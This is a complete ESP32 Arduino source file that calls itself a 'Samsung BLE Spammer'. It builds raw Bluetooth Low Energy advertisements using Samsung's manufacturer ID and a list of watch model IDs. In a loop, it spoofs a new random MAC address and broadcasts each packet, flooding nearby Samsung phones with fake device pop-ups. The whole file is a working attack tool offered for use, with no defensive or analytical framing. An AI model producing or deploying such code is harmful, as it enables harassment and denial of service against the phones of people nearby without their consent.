/*
 * ESP32-Samsung-BLE-Spammer
 * A tool that spams samsung BLE devices.
 * Author - WireBits
 */

#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>

#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_gap_ble_api.h"
#include "esp_bt_defs.h"
#include "esp_err.h"
#include "esp_log.h"
#include "esp_system.h"

#define DEVICE_NAME         "ESP32-Samsung-BLE-Spammer"
#define SERVICE_UUID        "7A0247E7-8E88-409B-A959-AB5092DDB03E"
#define CHARACTERISTIC_UUID "82258BAA-DF72-47E8-99BC-B73D7ECD08A5"

static const char *TAG = "ESP32-Samsung-BLE-Spammer";

const uint8_t PREPENDED_BYTES[] = {
  0x01,0x00,0x02,0x00,0x01,0x01,0xFF,0x00,0x00,0x43
};

const char* names[] = {
  "Samsung Galaxy 420 Edition"
};
const size_t NAMES_COUNT = sizeof(names)/sizeof(names[0]);

const uint8_t watch_ids[] = {
  0x1A,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,
  0x0A,0x0B,0x0C,0x11,0x12,0x13,0x14,0x15,0x16,0x17,
  0x18,0x1B,0x1C,0x1D,0x1E,0x20
};
const size_t WATCH_IDS_COUNT = sizeof(watch_ids) / sizeof(watch_ids[0]);

const uint16_t MANUFACTURER_ID = 0x0075;

static esp_ble_adv_params_t adv_params = {
  .adv_int_min = 160,
  .adv_int_max = 160,
  .adv_type = ADV_TYPE_NONCONN_IND,
  .own_addr_type = BLE_ADDR_TYPE_RANDOM,
  .peer_addr = {0},
  .peer_addr_type = BLE_ADDR_TYPE_PUBLIC,
  .channel_map = ADV_CHNL_ALL,
  .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY
};

BLEServer *pServer = nullptr;
BLECharacteristic *pCharacteristic = nullptr;
bool deviceConnected = false;
uint8_t notifyValue = 0;

class MyServerCallbacks : public BLEServerCallbacks {
  void onConnect(BLEServer *pServer) {
    deviceConnected = true;
    Serial.println("deviceConnected = true");
    esp_ble_gap_stop_advertising();
  };

  void onDisconnect(BLEServer *pServer) {
    deviceConnected = false;
    Serial.println("deviceConnected = false");
  }
};

class MyCallbacks : public BLECharacteristicCallbacks {
  void onWrite(BLECharacteristic *pCharacteristic) {
    String rxValue = pCharacteristic->getValue().c_str();
    if (rxValue.length() > 0) {
      Serial.println("---------");
      Serial.print("Received Value: ");
      Serial.println(rxValue);
      Serial.println("---------");
    }
  }
};

uint8_t* build_adv_packet(uint16_t manufacturer_id, uint8_t watch_id, size_t* out_len) {
  size_t man_data_len = 2 + sizeof(PREPENDED_BYTES) + 1;
  uint8_t* man_data = (uint8_t*)malloc(man_data_len);
  if (!man_data) return nullptr;
  man_data[0] = (uint8_t)(manufacturer_id & 0xFF);
  man_data[1] = (uint8_t)((manufacturer_id >> 8) & 0xFF);
  memcpy(man_data + 2, PREPENDED_BYTES, sizeof(PREPENDED_BYTES));
  man_data[2 + sizeof(PREPENDED_BYTES)] = watch_id;
  const uint8_t flags[] = {0x02, 0x01, 0x06};
  size_t manuf_ad_len = 1 + 1 + man_data_len;
  size_t total_len = sizeof(flags) + manuf_ad_len;
  uint8_t* adv = (uint8_t*)malloc(total_len);
  if (!adv) {
    free(man_data);
    return nullptr;
  }
  size_t idx = 0;
  memcpy(adv + idx, flags, sizeof(flags));
  idx += sizeof(flags);
  adv[idx++] = (uint8_t)(man_data_len + 1);
  adv[idx++] = 0xFF;
  memcpy(adv + idx, man_data, man_data_len);
  idx += man_data_len;
  free(man_data);
  *out_len = idx;
  return adv;
}

void generate_random_static_addr(uint8_t addr_out[6]) {
  uint8_t raw[6];
  for (int i = 0; i < 6; ++i) {
    uint32_t r = esp_random();
    raw[i] = (uint8_t)(r & 0xFF);
  }
  raw[5] = (raw[5] & 0x3F) | 0xC0;
  for (int i = 0; i < 6; ++i) addr_out[i] = raw[i];
}

void print_mac(const uint8_t addr[6]) {
  char buf[32];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
          addr[5], addr[4], addr[3], addr[2], addr[1], addr[0]);
  Serial.print(buf);
}

void start_advertising_raw(uint8_t* adv_data, size_t adv_len) {
  esp_err_t err;
  err = esp_ble_gap_config_adv_data_raw(adv_data, adv_len);
  if (err != ESP_OK) {
    ESP_LOGE(TAG, "esp_ble_gap_config_adv_data_raw failed: %d", err);
    return;
  }
  delay(30);
  err = esp_ble_gap_start_advertising(&adv_params);
  if (err != ESP_OK) {
    ESP_LOGE(TAG, "esp_ble_gap_start_advertising failed: %d", err);
  } else {
    ESP_LOGI(TAG, "Started advertising (raw)");
  }
}

void stop_advertising_raw() {
  esp_err_t err = esp_ble_gap_stop_advertising();
  if (err != ESP_OK) {
    ESP_LOGE(TAG, "esp_ble_gap_stop_advertising failed: %d", err);
  } else {
    ESP_LOGI(TAG, "Stopped advertising (raw)");
  }
}

void init_service() {
  BLEService *pService = pServer->createService(BLEUUID(SERVICE_UUID));
  pCharacteristic = pService->createCharacteristic(
    CHARACTERISTIC_UUID,
    BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE | BLECharacteristic::PROPERTY_NOTIFY
  );
  pCharacteristic->setCallbacks(new MyCallbacks());
  pCharacteristic->addDescriptor(new BLE2902());
  pService->start();
}

void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println();
  Serial.println("Initializing ESP32-Samsung-BLE-Spammer...");
  BLEDevice::init(DEVICE_NAME);
  pServer = BLEDevice::createServer();
  pServer->setCallbacks(new MyServerCallbacks());
  init_service();
  uint32_t seed = esp_random();
  randomSeed((unsigned long)seed);
  Serial.println("Service created. Loop will perform Samsung-style advertising when no client connected.");
}

unsigned long lastAdvMillis = 0;

void loop() {
  if (deviceConnected) {
    Serial.printf("*** NOTIFY: %d ***\n", notifyValue);
    pCharacteristic->setValue(&notifyValue, 1);
    pCharacteristic->notify();
    notifyValue++;
    delay(2000);
    return;
  }
  uint8_t new_addr[6];
  generate_random_static_addr(new_addr);
  Serial.print("Setting spoofed random static address: ");
  print_mac(new_addr);
  Serial.println();
  esp_err_t err = esp_ble_gap_set_rand_addr(new_addr);
  if (err != ESP_OK) {
    ESP_LOGE(TAG, "esp_ble_gap_set_rand_addr failed: %d", err);
  } else {
    delay(10);
  }
  size_t idx = random(0, (int)NAMES_COUNT);
  const char* chosen_name = names[idx];
  Serial.print("Setting device name: ");
  Serial.println(chosen_name);
  err = esp_ble_gap_set_device_name(chosen_name);
  if (err != ESP_OK) {
    ESP_LOGE(TAG, "esp_ble_gap_set_device_name failed: %d", err);
  }
  uint8_t watch_id = watch_ids[random(0, (int)WATCH_IDS_COUNT)];
  Serial.print("Chosen watch_id: 0x");
  if (watch_id < 16) Serial.print("0");
  Serial.println(watch_id, HEX);
  size_t adv_len = 0;
  uint8_t* adv_packet = build_adv_packet(MANUFACTURER_ID, watch_id, &adv_len);
  if (!adv_packet) {
    ESP_LOGE(TAG, "Failed to allocate adv packet");
    delay(1000);
    return;
  }
  Serial.print("Advertising packet (raw): ");
  for (size_t i = 0; i < adv_len; ++i) {
    if (adv_packet[i] < 16) Serial.print('0');
    Serial.print(adv_packet[i], HEX);
    Serial.print(' ');
  }
  Serial.println();
  start_advertising_raw(adv_packet, adv_len);
  delay(1000);
  stop_advertising_raw();
  free(adv_packet);
  delay(10);
}